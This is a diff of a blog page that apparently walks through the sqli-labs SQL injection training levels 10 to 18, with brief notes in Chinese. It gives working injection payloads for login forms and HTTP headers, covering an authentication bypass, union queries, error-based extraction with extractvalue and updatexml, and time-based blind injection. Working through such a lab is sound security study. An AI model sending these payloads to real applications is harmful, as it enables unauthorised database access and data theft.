@@ -40,7 +40,14 @@ ga('send', 'pageview');
 <meta property="og:image" content="https://s2.ax1x.com/2019/03/04/kXV2Tg.png">
 <meta property="og:image" content="https://s2.ax1x.com/2019/03/04/kXVb0U.png">
 <meta property="og:image" content="https://s2.ax1x.com/2019/03/04/kXZS6x.png">
-<meta property="og:updated_time" content="2019-03-06T12:29:40.754Z">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/10/A9VId1.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/10/A9aHHI.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/10/A9azvQ.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/10/A98NW9.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/10/A9JFUS.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/10/A9Nzi8.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/10/A9UGo6.png">
+<meta property="og:updated_time" content="2019-03-10T14:45:13.608Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sqli-labs">
 <meta name="twitter:description" content="闭合有&amp;#39; &amp;quot; ) 单双引号不能同时存在，) 可有多个 Less-1 single 单个的quote 引号变量前面加 ?information_schema.tablesinformation_schema.columnsinformation_schema.schemata  在Less-1里的index.php中添加 echo $sql; 可在网页中显示查询代码，echo &amp;">
@@ -212,10 +219,32 @@ ga('send', 'pageview');
 <p>利用页面返回时间判断对错<br>例如<br><code>?id=1&#39; and if((select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101,sleep(5),1) --+</code></p>
 <hr>
 <h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p>与上题相同，不过利用<code>&quot;</code>进行闭合</p>
-<hr>
-<h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><pre><code>GET - 从指定的资源请求数据。
+<h2 id="更新于2019-03-06-20-29-31-星期三"><a href="#更新于2019-03-06-20-29-31-星期三" class="headerlink" title="更新于2019-03-06 20:29:31 星期三"></a>更新于2019-03-06 20:29:31 星期三</h2><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><pre><code>GET - 从指定的资源请求数据。
 POST - 向指定的资源提交要被处理的数据
-</code></pre><p>更新于2019-03-06 20:29:31 星期三</p>
+</code></pre><p>输入<code>&#39;</code>报错，知用<code>&#39;</code>闭合<br><code>uname=&#39; or &#39;1&#39;=&#39;1&amp;passwd=&#39; or &#39;1&#39;=&#39;1&amp;submit=Submit</code><br>可以直接爆出来<br>其他相同<br><code>uname=&#39; or &#39;1&#39;=&#39;1&amp;passwd=&#39; union select 1,2#&amp;submit=Submit</code><br><a href="https://imgchr.com/i/A9VId1" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/10/A9VId1.png" alt="A9VId1.png"></a></p>
+<hr>
+<h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>实验可知用<code>&quot;)</code>闭合<br>其他相同</p>
+<hr>
+<h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><p>实验知用<code>&#39;)</code> 闭合<br>其他相同，例如</p>
+<p><code>uname=1&amp;passwd=1&#39;) and extractvalue(1,concat(0x7e,(database()))) #&amp;submit=Submit</code></p>
+<p><a href="https://imgchr.com/i/A9aHHI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/10/A9aHHI.png" alt="A9aHHI.png"></a></p>
+<p><code>uname=1&amp;passwd=1&#39;) and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1))) #&amp;submit=Submit</code></p>
+<p><a href="https://imgchr.com/i/A9azvQ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/10/A9azvQ.png" alt="A9azvQ.png"></a></p>
+<hr>
+<h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p>实验知用<code>&quot;</code>闭合<br>其他和上题相同</p>
+<hr>
+<h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><p>实验知用<code>&#39;</code>闭合<br>但没用报错信息<br>所以使用时间或布尔注入<br><code>uname=&#39; or if(ascii(substr(database(),1,1))=115,sleep(0.5),1) #&amp;passwd=1&amp;submit=Submit</code></p>
+<hr>
+<h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p>实验知用<code>&quot;</code>闭合<br>其他和上题相同</p>
+<hr>
+<h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>在uname中注入，都没有反应<br>在password中注入，也没有反应<br>后知先验证用户名正确后，才执行password</p>
+<h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h5><p><code>uname=admin&amp;passwd=1&#39; or updatexml(1,concat(0x7e,version(),0x7e),1)# &amp;submit=Submit</code></p>
+<p><a href="https://imgchr.com/i/A98NW9" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/10/A98NW9.png" alt="A98NW9.png"></a></p>
+<p><code>uname=admin&amp;passwd=1&#39; or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)# &amp;submit=Submit</code></p>
+<p><a href="https://imgchr.com/i/A9JFUS" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/10/A9JFUS.png" alt="A9JFUS.png"></a><br>其他相同</p>
+<h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><p>使用正确账号密码后，页面显示user-agent，则可以在这上面注入</p>
+<p><code>1&#39; and extractvalue(1,concat(0x7e,(select user()),0x7e)) and &#39;1&#39;=&#39;1</code><br><a href="https://imgchr.com/i/A9Nzi8" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/10/A9Nzi8.png" alt="A9Nzi8.png"></a><br><code>1&#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e)) and &#39;1&#39;=&#39;1</code><br><a href="https://imgchr.com/i/A9UGo6" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/10/A9UGo6.png" alt="A9UGo6.png"></a><br>其他相同<br><em>HTTP 请求头中除了 User-Agent可能存在sql注入意外，还有referer、X-Forwarded-For可能存在sql注入。</em></p>
+<p>更新于2019-03-10 22:43:03 星期日</p>
 <hr>
 
       
@@ -224,7 +253,7 @@ POST - 向指定的资源提交要被处理的数据
     <span id="busuanzi_container_page_pv">
   本文总阅读量<span id="busuanzi_value_page_pv"></span>次
 	</span>
-      <a data-url="http://finsenty54.github.io/2019/02/27/sqli-labs/" data-id="cjt313j3u000410w8y3f2pvd1" class="article-share-link">Share</a>
+      <a data-url="http://finsenty54.github.io/2019/02/27/sqli-labs/" data-id="cjt44bzfa0004ogw8mtw2n7kq" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql/">sql</a></li></ul>
